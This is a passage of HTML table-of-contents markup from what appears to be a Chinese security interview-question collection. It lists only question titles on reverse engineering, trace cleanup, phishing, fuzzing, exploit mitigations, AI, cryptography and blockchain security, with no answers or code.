class="toc-text">进程和线程内存空间的关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E4%B8%8B%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B"><span class="toc-number">23.0.2.</span> <span class="toc-text">介绍下父子进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B%E5%8C%BA%E5%88%AB"><span class="toc-number">23.0.3.</span> <span class="toc-text">孤儿进程和僵尸进程区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kill-%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B%E7%9A%84%E6%97%B6%E5%80%99%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E9%82%A3%E4%BA%9B%E4%BA%8B%E6%83%85%EF%BC%8C%E4%BB%8E%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E8%A7%92%E5%BA%A6%E8%AE%B2"><span class="toc-number">23.0.4.</span> <span class="toc-text">Kill 一个进程的时候都发生了那些事情，从父子进程角度讲</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">23.0.5.</span> <span class="toc-text">Linux 开机自启动方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E6%9C%89%E5%93%AA%E4%BA%9B%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">23.0.6.</span> <span class="toc-text">Linux 有哪些系统调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E8%AF%B4-Linux-%E4%B8%8B%E7%9A%84-Syscall"><span class="toc-number">23.0.7.</span> <span class="toc-text">说说 Linux 下的 Syscall</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#24-%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3"><span class="toc-number">24.</span> <span class="toc-text">24- 逆向破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E7%BB%99%E5%87%BA%E5%87%BD%E6%95%B0%E5%AE%B6%E6%97%8F%E7%9A%84-md5%EF%BC%8C%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%88%86%E7%B1%BB"><span class="toc-number">24.0.1.</span> <span class="toc-text">恶意样本给出函数家族的 md5，如何进行分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%A2%E5%AF%B9%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E7%9A%84%E5%A4%A7%E5%9E%8B%E6%9C%A8%E9%A9%AC%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87-IDA-%E5%AE%9A%E4%BD%8D%E5%85%B6%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E9%83%A8%E5%88%86%E7%9A%84%E9%80%BB%E8%BE%91"><span class="toc-number">24.0.2.</span> <span class="toc-text">面对静态编译的大型木马如何通过 IDA 定位其网络传输部分的逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8A%A8%E6%80%81%E5%9C%B0%E5%8E%BB%E6%89%BE%E5%AF%BC%E5%85%A5%E8%A1%A8"><span class="toc-number">24.0.3.</span> <span class="toc-text">如何动态地去找导入表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%B8%8D%E5%9C%A8%E7%BC%96%E7%A0%81%E6%97%B6%E7%9B%B4%E6%8E%A5%E5%AF%BC%E5%85%A5%E7%9B%B8%E5%85%B3-API-%E7%9A%84%E5%89%8D%E6%8F%90%E4%B8%8B%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">24.0.4.</span> <span class="toc-text">如何不在编码时直接导入相关 API 的前提下进行攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E4%B8%8B%E6%9C%89%E5%93%AA%E4%BA%9B%E5%B8%B8%E7%94%A8%E7%9A%84%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF"><span class="toc-number">24.0.5.</span> <span class="toc-text">Windows 下有哪些常用的反调试技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E6%AD%A5%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">24.0.6.</span> <span class="toc-text">单步执行的原理是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E5%B7%B2-Load-%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E6%89%BE%E5%88%B0%E5%85%B6%E5%85%B7%E6%9C%89%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90%E7%9A%84%E6%AE%B5"><span class="toc-number">24.0.7.</span> <span class="toc-text">在内存中已 Load 的程序如何快速找到其具有执行权限的段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E6%A1%88%E6%A3%80%E6%B5%8B%E8%87%AA%E5%B7%B1%E5%A4%84%E4%BA%8E%E6%B2%99%E7%AE%B1%E4%B8%AD"><span class="toc-number">24.0.8.</span> <span class="toc-text">恶意软件有哪些方案检测自己处于沙箱中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E4%B8%80%E4%B8%AA%E5%8F%8D%E6%B1%87%E7%BC%96%E5%99%A8%EF%BC%8C%E6%8C%87%E4%BB%A4%E9%9B%86-opcode-%E7%9A%84%E6%84%8F%E4%B9%89%E5%8E%BB%E5%93%AA%E6%9F%A5"><span class="toc-number">24.0.9.</span> <span class="toc-text">做一个反汇编器，指令集 opcode 的意义去哪查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E8%AF%86%E5%88%AB%E6%8C%87%E4%BB%A4%E8%B7%B3%E8%BD%AC%E6%9D%A1%E4%BB%B6%E5%92%8C%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE"><span class="toc-number">24.0.10.</span> <span class="toc-text">怎么识别指令跳转条件和内存访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%9A%E4%B8%80%E4%B8%AA%E6%B2%99%E7%AE%B1%EF%BC%8C%E6%9C%89%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E9%87%8D%E5%AE%9A%E5%90%91%E7%9A%84"><span class="toc-number">24.0.11.</span> <span class="toc-text">做一个沙箱，有什么需要重定向的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E7%A8%8B%E5%BA%8F%E5%88%86%E4%B8%BA%E5%93%AA%E5%87%A0%E4%B8%AA%E6%AE%B5"><span class="toc-number">24.0.12.</span> <span class="toc-text">Linux 程序分为哪几个段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESP-%E5%AE%9A%E5%BE%8B%E5%8E%9F%E7%90%86%E7%9F%A5%E9%81%93%E5%90%97"><span class="toc-number">24.0.13.</span> <span class="toc-text">ESP 定律原理知道吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-%E7%A8%8B%E5%BA%8F%E6%80%8E%E4%B9%88%E5%8E%BB%E9%80%86%E5%90%91%E6%89%BE%E8%99%9A%E8%A1%A8"><span class="toc-number">24.0.14.</span> <span class="toc-text">C++ 程序怎么去逆向找虚表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B"><span class="toc-number">24.0.15.</span> <span class="toc-text">进程隐藏技术是什么，如何检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8B%EF%BC%8CA-%E8%BF%9B%E7%A8%8B%E7%9A%84-Source-%E8%A7%A6%E5%8F%91%E5%88%B0%E4%BA%86-B-%E8%BF%9B%E7%A8%8B%E7%9A%84-sink-%E7%82%B9%EF%BC%8C%E5%A6%82%E4%BD%95%E6%BA%AF%E6%BA%90"><span class="toc-number">24.0.16.</span> <span class="toc-text">如果多进程下，A 进程的 Source 触发到了 B 进程的 sink 点，如何溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI-%E5%A6%82%E4%BD%95%E5%81%9A-Hook"><span class="toc-number">24.0.17.</span> <span class="toc-text">JNDI 如何做 Hook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data-%E6%AE%B5%E5%AD%98%E6%94%BE%E5%93%AA%E4%BA%9B%E6%95%B0%E6%8D%AE"><span class="toc-number">24.0.18.</span> <span class="toc-text">.data 段存放哪些数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bss-%E6%AE%B5%E5%AD%98%E6%94%BE%E5%93%AA%E4%BA%9B%E6%95%B0%E6%8D%AE"><span class="toc-number">24.0.19.</span> <span class="toc-text">.bss 段存放哪些数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%97%B6%E7%9A%84%E6%B5%81%E7%A8%8B%EF%BC%8C%E5%8F%82%E6%95%B0%E5%A6%82%E4%BD%95%E4%BC%A0%E5%85%A5%E4%BB%A5%E5%8F%8A%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">24.0.20.</span> <span class="toc-text">函数调用时的流程，参数如何传入以及寄存器、栈的变化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E9%93%BE%E6%8E%A5%EF%BC%8C%E7%BC%96%E8%AF%91%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%AD%E4%BC%9A%E6%9C%89%E5%93%AA%E4%BA%9B%E6%93%8D%E4%BD%9C"><span class="toc-number">24.0.21.</span> <span class="toc-text">解释程序的编译和链接，编译的过程中会有哪些操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E8%AF%B4-If-Else-%E8%AF%AD%E6%B3%95%E6%A0%91"><span class="toc-number">24.0.22.</span> <span class="toc-text">说说 If&#x2F;Else 语法树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%AF%94%E8%BE%83%E4%B8%A4%E4%B8%AA-C-%E5%87%BD%E6%95%B0%E7%9A%84%E7%9B%B8%E4%BC%BC%E5%BA%A6"><span class="toc-number">24.0.23.</span> <span class="toc-text">如何比较两个 C 函数的相似度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E4%B8%8B%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%8E-IDA-%E5%8F%8D%E7%BC%96%E8%AF%91%E7%A8%8B%E5%BA%8F%E7%9A%84%E4%BB%A3%E7%A0%81%E5%B7%AE%E5%88%AB%E5%BE%88%E5%A4%A7"><span class="toc-number">24.0.24.</span> <span class="toc-text">什么情况下源代码与 IDA 反编译程序的代码差别很大</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#25-%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="toc-number">25.</span> <span class="toc-text">25- 痕迹清除</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%85%E7%90%86%E6%97%A5%E5%BF%97%E8%A6%81%E6%B8%85%E7%90%86%E5%93%AA%E4%BA%9B"><span class="toc-number">25.0.1.</span> <span class="toc-text">清理日志要清理哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A0%E9%99%A4-Linux-%E6%9C%BA%E5%99%A8%E7%9A%84%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9"><span class="toc-number">25.0.2.</span> <span class="toc-text">如何删除 Linux 机器的入侵痕迹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#26-%E9%92%93%E9%B1%BC%E7%A4%BE%E5%B7%A5"><span class="toc-number">26.</span> <span class="toc-text">26- 钓鱼社工</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E6%96%B9%E6%B3%95%E9%99%A4%E4%BA%86-exe-%E8%BF%99%E7%A7%8D%E5%8F%8C%E5%87%BB%E7%9A%84%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88"><span class="toc-number">26.0.1.</span> <span class="toc-text">钓鱼方法除了 exe 这种双击的还有什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E4%B8%8A%E7%BA%BF%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-number">26.0.2.</span> <span class="toc-text">钓鱼上线的主机如何进行利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">26.0.3.</span> <span class="toc-text">伪造电子邮件的原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#27-%E4%BA%8C%E8%BF%9B%E5%88%B6-%E7%B3%BB%E5%88%97"><span class="toc-number">27.</span> <span class="toc-text">27- 二进制 系列</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E6%8E%A7%E5%9C%BA%E6%99%AF%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E4%B8%8E%E6%99%AE%E9%80%9A%E5%9C%BA%E6%99%AF%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">27.0.1.</span> <span class="toc-text">工控场景的入侵检测与普通场景入侵检测的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E6%AF%94%E4%B8%80%E4%B8%8B-QEMU-%E6%A8%A1%E5%BC%8F%E7%9A%84-Fuzzing-%E5%92%8C%E6%BA%90%E7%A0%81%E6%A8%A1%E5%BC%8F%E7%9A%84-Fuzzing"><span class="toc-number">27.0.2.</span> <span class="toc-text">对比一下 QEMU 模式的 Fuzzing 和源码模式的 Fuzzing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E8%AF%B4-QEMU-%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%8A%A8%E6%80%81%E6%8F%92%E6%A1%A9%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0%E7%9A%84%EF%BC%8C%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E7%BC%BA%E7%82%B9"><span class="toc-number">27.0.3.</span> <span class="toc-text">说说 QEMU 模式的动态插桩怎么实现的，有什么优缺点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fuzz-%E6%99%AE%E9%80%9A%E7%A8%8B%E5%BA%8F%E5%92%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%89%E5%93%AA%E4%BA%9B%E4%B8%8D%E5%90%8C%E7%82%B9"><span class="toc-number">27.0.4.</span> <span class="toc-text">fuzz 普通程序和数据库有哪些不同点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E8%AF%B4-AFL-%E5%92%8C-AFL-%E6%9C%89%E5%93%AA%E4%BA%9B%E4%B8%8D%E5%90%8C"><span class="toc-number">27.0.5.</span> <span class="toc-text">说说 AFL++ 和 AFL 有哪些不同</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E7%BB%99-AFL-%E5%81%9A%E9%80%82%E9%85%8D%E5%8E%BB-fuzz-%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">27.0.6.</span> <span class="toc-text">怎么给 AFL 做适配去 fuzz 数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8B-fuzz-%E7%9A%84%E6%B5%81%E7%A8%8B%EF%BC%8C%E4%BB%8E%E9%80%89%E5%8F%96%E7%9B%AE%E6%A0%87%E5%BC%80%E5%A7%8B"><span class="toc-number">27.0.7.</span> <span class="toc-text">介绍一下 fuzz 的流程，从选取目标开始</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E4%B8%80%E4%B8%8B-AFL-%E7%9A%84%E6%8F%92%E6%A1%A9%E5%8E%9F%E7%90%86"><span class="toc-number">27.0.8.</span> <span class="toc-text">讲一下 AFL 的插桩原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E9%80%89%E6%8B%A9-fuzz-%E6%B5%8B%E8%AF%95%E7%82%B9"><span class="toc-number">27.0.9.</span> <span class="toc-text">怎么选择 fuzz 测试点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%AA%E4%BA%9B%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%A5%E7%94%A8-fuzz-%E6%A3%80%E6%B5%8B%E5%88%B0"><span class="toc-number">27.0.10.</span> <span class="toc-text">哪些漏洞可以用 fuzz 检测到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%AA%E4%BA%9B%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%A5%E7%94%A8-fuzz-%E6%A3%80%E6%B5%8B%E5%88%B0-1"><span class="toc-number">27.0.11.</span> <span class="toc-text">哪些漏洞可以用 fuzz 检测到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E6%98%AF%E5%A6%82%E4%BD%95%E5%81%9A%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3%E7%9A%84"><span class="toc-number">27.0.12.</span> <span class="toc-text">符号执行是如何做约束求解的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E8%AE%B2-Linux-%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%BC%93%E8%A7%A3%E6%9C%BA%E5%88%B6"><span class="toc-number">27.0.13.</span> <span class="toc-text">讲讲 Linux 平台的漏洞缓解机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NX-%E6%98%AF%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87%E7%9A%84"><span class="toc-number">27.0.14.</span> <span class="toc-text">NX 是怎么绕过的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E8%AE%B2-Linux-%E5%B9%B3%E5%8F%B0%E7%9A%84-ELF-%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">27.0.15.</span> <span class="toc-text">讲讲 Linux 平台的 ELF 文件结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E8%AE%B2-Windows-%E5%B9%B3%E5%8F%B0%E7%9A%84-PE-%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">27.0.16.</span> <span class="toc-text">讲讲 Windows 平台的 PE 文件结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E8%AE%B2-ASLR-%E6%80%8E%E4%B9%88%E7%BB%95%E8%BF%87"><span class="toc-number">27.0.17.</span> <span class="toc-text">讲讲 ASLR 怎么绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%8C%E5%8C%BA%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">27.0.18.</span> <span class="toc-text">函数的调用约定有哪些，区别是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fuzzing-%E4%B8%BB%E8%A6%81%E6%98%AF%E7%94%A8%E6%9D%A5%E5%B9%B2%E5%98%9B"><span class="toc-number">27.0.19.</span> <span class="toc-text">fuzzing 主要是用来干嘛</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9-Windows-%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BA%86%E8%A7%A3%E5%A4%9A%E5%B0%91"><span class="toc-number">27.0.20.</span> <span class="toc-text">对 Windows 平台的漏洞和保护机制了解多少</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#28-AI%E5%AE%89%E5%85%A8"><span class="toc-number">28.</span> <span class="toc-text">28- AI安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E4%B8%8B-SVM"><span class="toc-number">28.0.1.</span> <span class="toc-text">介绍下 SVM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%99%8D%E4%BD%8E%E6%A8%A1%E5%9E%8B%E7%9A%84%E8%AF%AF%E6%8A%A5%E7%8E%87"><span class="toc-number">28.0.2.</span> <span class="toc-text">如何降低模型的误报率</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%BE%E6%94%BB%E5%87%BB%E6%A0%B7%E6%9C%AC"><span class="toc-number">28.0.3.</span> <span class="toc-text">如何找攻击样本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E4%B8%8B-KNN"><span class="toc-number">28.0.4.</span> <span class="toc-text">介绍下 KNN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E4%BB%8B%E7%BB%8D"><span class="toc-number">28.0.5.</span> <span class="toc-text">卷积神经网络介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B1%E6%96%87%E6%96%AF%E5%9D%A6%E8%B7%9D%E7%A6%BB"><span class="toc-number">28.0.6.</span> <span class="toc-text">莱文斯坦距离</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%80%92%E6%8E%92%E7%B4%A2%E5%BC%95"><span class="toc-number">28.0.7.</span> <span class="toc-text">倒排索引</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%9A%84%E7%AE%97%E6%B3%95%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">28.0.8.</span> <span class="toc-text">搜索引擎的算法有哪些</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3-TF-IDF-%E6%96%87%E6%A1%A3%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%95%E5%90%97"><span class="toc-number">28.0.9.</span> <span class="toc-text">了解 TF-IDF 文档匹配算法吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SGD-%E5%92%8C-Adam-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">28.0.10.</span> <span class="toc-text">SGD 和 Adam 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BC%A9%E5%87%8F%E6%A8%A1%E5%9E%8B%E7%9A%84%E6%A3%80%E6%B5%8B%E6%97%B6%E5%BB%B6"><span class="toc-number">28.0.11.</span> <span class="toc-text">如何缩减模型的检测时延</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#29-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%89%E5%85%A8"><span class="toc-number">29.</span> <span class="toc-text">29- 密码学安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA-%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86"><span class="toc-number">29.0.1.</span> <span class="toc-text">RSA 算法原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AES-%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86"><span class="toc-number">29.0.2.</span> <span class="toc-text">AES 算法原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E4%B8%80%E4%B8%8B%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B"><span class="toc-number">29.0.3.</span> <span class="toc-text">说一下非对称加密算法的加密过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%93%AA%E4%BA%9B%E4%BA%86%E8%A7%A3%E8%BF%87%E7%9A%84%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-number">29.0.4.</span> <span class="toc-text">有哪些了解过的非对称加密算法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">29.0.5.</span> <span class="toc-text">栅栏密码的原理是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Padding-Oracle-Attack-%E8%AE%B2%E8%AE%B2"><span class="toc-number">29.0.6.</span> <span class="toc-text">Padding Oracle Attack 讲讲</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#30-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8"><span class="toc-number">30.</span> <span class="toc-text">30- 区块链安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E8%AF%B4%E4%BA%A4%E6%98%93%E6%89%80"><span class="toc-number">30.0.1.</span> <span class="toc-text">说说交易所</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B2%E4%B8%80%E8%AE%B2%E5%8C%BA%E5%9D%97%E9%93%BE%E9%80%86%E5%90%91%E5%87%BD%E6%95%B0%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E6%8E%A5%E6%94%B6%E5%8F%82%E6%95%B0%E7%9A%84%E6%8C%87%E4%BB%A4%E9%9B%86"><span class="toc-number">30.0.2.</span> <span class="toc-text">讲一讲区块链逆向函数涉及到的接收参数的指令集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E8%AF%B4%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">30.0.3.</span> <span class="toc-text">说说重入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-DeFi-%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%BB%BA%E7%AB%8B%E4%BA%86%E5%90%84%E7%A7%8D%E5%90%84%E6%A0%B7%E7%9A%84%E7%BB%8F%E6%B5%8E%E6%A8%A1%E5%9E%8B%EF%BC%8C%E6%80%8E%E6%A0%B7%E6%89%8D%E8%83%BD%E6%89%BE%E5%87%BA%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">30.0.4.</span> <span class="toc-text">在 DeFi 项目中建立了各种各样的经济模型，怎样才能找出可能存在的漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libsnark-%E6%A0%B8%E5%BF%83%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">30.0.5.</span> <span class="toc-text">libsnark 核心是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#truffle%E3%80%81solidity-%E4%BA%86%E8%A7%A3%E5%90%97"><span class="toc-number">30.0.6.</span> <span class="toc-text">truffle、solidity 了解吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E7%9A%84%E9%89%B4%E6%9D%83%E3%80%81%E5%85%AC%E7%A7%81%E5%AF%86%E9%92%A5"><span class="toc-number">30.0.7.</span> <span class="toc-text">智能合约的鉴权、公私密钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E9%92%B1%E5%8C%85%E7%9A%84%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span 